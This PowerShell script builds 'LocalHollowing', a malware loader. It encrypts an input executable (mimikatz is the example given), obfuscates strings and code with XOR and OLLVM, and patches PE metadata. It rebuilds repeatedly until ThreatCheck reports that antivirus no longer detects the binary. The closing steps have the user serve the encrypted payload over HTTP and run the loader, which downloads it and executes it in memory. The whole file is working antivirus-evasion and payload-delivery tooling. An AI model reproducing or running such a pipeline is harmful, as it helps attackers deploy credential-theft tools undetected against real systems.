# run_pipeline.ps1 - Orchestrate the full LocalHollowing build pipeline.
#
# Steps:
#   1. Resolve input PE (auto-detect in input/ or use -InputPath)
#   2. Encrypt payload  -> output/payload.bin + output/mimi_key.h
#   3. Generate resolve.h (XOR-obfuscated)
#   4. Copy headers     -> LocalHollowing/
#   5. Compile + link   -> output/LocalHollowing.exe
#
# The payload URL is a runtime arg of LocalHollowing.exe, not a pipeline flag.
#
# Usage:
#   .\scripts\run_pipeline.ps1
#   .\scripts\run_pipeline.ps1 -InputPath input\mimikatz.exe
#   .\scripts\run_pipeline.ps1 -NoObf     # diagnostic build without OLLVM

param(
    [string]$InputPath,
    [switch]$NoObf,
    [string]$ThreatCheck = "C:\Users\chems\Desktop\ThreatCheck\ThreatCheck\bin\Release\ThreatCheck.exe",
    [int]$MaxAttempts = 10
)

$PROJECT_ROOT = Split-Path $PSScriptRoot -Parent
$INPUT_DIR    = Join-Path $PROJECT_ROOT "input"
$OUTPUT_DIR   = Join-Path $PROJECT_ROOT "output"
$SOURCE_DIR   = Join-Path $PROJECT_ROOT "LocalHollowing"
$SCRIPTS_DIR  = $PSScriptRoot
$CONFIG_JSON  = Join-Path $PROJECT_ROOT "config.json"
$OUTPUT_EXE   = Join-Path $OUTPUT_DIR   "LocalHollowing.exe"

Write-Host ""
Write-Host "======================================" -ForegroundColor Yellow
Write-Host "   LocalHollowing Build Pipeline" -ForegroundColor Yellow
Write-Host "======================================" -ForegroundColor Yellow
Write-Host ""

# -- STEP 1 : Resolve input PE -------------------------------------------------

if ($InputPath) {
    if (-not [System.IO.Path]::IsPathRooted($InputPath)) {
        $candidate = Join-Path $PROJECT_ROOT $InputPath
        if (Test-Path $candidate) {
            $INPUT_PE = $candidate
        } else {
            $INPUT_PE = $InputPath
        }
    } else {
        $INPUT_PE = $InputPath
    }
} else {
    if (-not (Test-Path $INPUT_DIR)) {
        Write-Error "Input directory not found: $INPUT_DIR"
        exit 1
    }
    $candidates = @(Get-ChildItem -Path $INPUT_DIR -File)
    if ($candidates.Count -eq 0) {
        Write-Error "No file found in $INPUT_DIR. Place your PE there or pass -InputPath."
        exit 1
    } elseif ($candidates.Count -gt 1) {
        Write-Error "Multiple files in $INPUT_DIR. Specify which one with -InputPath:"
        $candidates | ForEach-Object { Write-Host "  $($_.Name)" -ForegroundColor Red }
        exit 1
    }
    $INPUT_PE = $candidates[0].FullName
}

if (-not (Test-Path $INPUT_PE)) {
    Write-Error "Payload not found: $INPUT_PE"
    exit 1
}

$payloadSize = [math]::Round((Get-Item $INPUT_PE).Length / 1KB, 1)
Write-Host "[1/5] Payload    : $INPUT_PE ($payloadSize KB)" -ForegroundColor Cyan

New-Item -ItemType Directory -Path $OUTPUT_DIR -Force | Out-Null

# -- STEP 2 : Encrypt payload --------------------------------------------------

Write-Host "[2/5] Encrypting payload (AES-256-CBC)..." -ForegroundColor Cyan

python "$SCRIPTS_DIR\encrypt_and_convert.py" $INPUT_PE $OUTPUT_DIR
if ($LASTEXITCODE -ne 0) {
    Write-Error "encrypt_and_convert.py failed"
    exit 1
}

# -- STEP 3 : Generate resolve.h -----------------------------------------------

Write-Host "[3/5] Generating resolve.h (XOR-obfuscated strings)..." -ForegroundColor Cyan

python "$SCRIPTS_DIR\generate_resolve.py" $CONFIG_JSON $OUTPUT_DIR
if ($LASTEXITCODE -ne 0) {
    Write-Error "generate_resolve.py failed"
    exit 1
}

# -- STEP 4 : Copy headers into VS source directory ----------------------------

Write-Host "[4/5] Copying headers -> LocalHollowing\" -ForegroundColor Cyan

Copy-Item "$OUTPUT_DIR\mimi_key.h" "$SOURCE_DIR\mimi_key.h" -Force
Copy-Item "$OUTPUT_DIR\resolve.h"  "$SOURCE_DIR\resolve.h"  -Force

# Clean up stale config.h from previous pipeline versions
Remove-Item "$SOURCE_DIR\config.h" -Force -ErrorAction SilentlyContinue
Remove-Item "$OUTPUT_DIR\config.h" -Force -ErrorAction SilentlyContinue

# -- STEP 5 : Build + ThreatCheck loop ----------------------------------------

$attempt  = 0
$cleanBin = $null

while ($attempt -lt $MaxAttempts) {
    $attempt++
    Write-Host ""
    Write-Host "[5/5] Build attempt $attempt / $MaxAttempts ..." -ForegroundColor Cyan

    if ($NoObf) { & "$SCRIPTS_DIR\build.ps1" -NoObf }
    else        { & "$SCRIPTS_DIR\build.ps1" }
    if ($LASTEXITCODE -ne 0) {
        Write-Error "build.ps1 failed on attempt $attempt"
        exit 1
    }

    Write-Host "[*] Patching PE (Rich Header, timestamp, entropy)..." -ForegroundColor Cyan
    python "$SCRIPTS_DIR\patch_pe.py" "$OUTPUT_EXE"
    if ($LASTEXITCODE -ne 0) {
        Write-Warning "patch_pe.py failed on attempt $attempt - continuing without patch"
    }

    if (-not (Test-Path $ThreatCheck)) {
        Write-Warning "ThreatCheck not found at '$ThreatCheck' - skipping AV scan"
        $cleanBin = $OUTPUT_EXE
        break
    }

    Write-Host "[*] Running ThreatCheck (attempt $attempt)..." -ForegroundColor Cyan
    $fullPath = (Resolve-Path $OUTPUT_EXE).ProviderPath
    $tcOutput = & $ThreatCheck -f "$fullPath" 2>&1
    $tcOutput | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }

    if ($tcOutput -match "No threat found") {
        Write-Host "[+] ThreatCheck: CLEAN on attempt $attempt" -ForegroundColor Green
        $cleanBin = $OUTPUT_EXE
        break
    } else {
        $offsetLine = ($tcOutput | Where-Object { $_ -match "offset 0x" }) | Select-Object -First 1
        Write-Host "[-] Detected$(if ($offsetLine) { " - $offsetLine" })" -ForegroundColor Red
        Write-Host "[*] Retrying with new OLLVM parameters..." -ForegroundColor Yellow
    }
}

if (-not $cleanBin) {
    Write-Error "All $MaxAttempts build attempts were flagged by ThreatCheck. Manual tuning required."
    exit 1
}

$cleanPath = Join-Path $OUTPUT_DIR "LocalHollowing_clean.exe"
Copy-Item $cleanBin $cleanPath -Force
Write-Host "[+] Clean binary saved : $cleanPath" -ForegroundColor Green

# -- SUMMARY -------------------------------------------------------------------

Write-Host ""
Write-Host "======================================" -ForegroundColor Green
Write-Host "   Pipeline complete" -ForegroundColor Green
Write-Host "======================================" -ForegroundColor Green

$files = @(
    @{ Label = "payload.bin           "; Path = "$OUTPUT_DIR\payload.bin" },
    @{ Label = "mimi_key.h            "; Path = "$OUTPUT_DIR\mimi_key.h" },
    @{ Label = "resolve.h             "; Path = "$OUTPUT_DIR\resolve.h" },
    @{ Label = "LocalHollowing.exe    "; Path = "$OUTPUT_DIR\LocalHollowing.exe" },
    @{ Label = "LocalHollowing_clean  "; Path = "$OUTPUT_DIR\LocalHollowing_clean.exe" }
)

foreach ($f in $files) {
    if (Test-Path $f.Path) {
        $kb = [math]::Round((Get-Item $f.Path).Length / 1KB, 1)
        Write-Host ("  {0} : {1} ({2} KB)" -f $f.Label, $f.Path, $kb) -ForegroundColor White
    }
}

Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "  1. Serve payload.bin:" -ForegroundColor White
Write-Host "     python -m http.server 8080 --directory `"$OUTPUT_DIR`"" -ForegroundColor Gray
Write-Host "  2. Run the loader with your URL as argument:" -ForegroundColor White
Write-Host "     .\output\LocalHollowing.exe http://127.0.0.1:8080/payload.bin" -ForegroundColor Gray
Write-Host ""
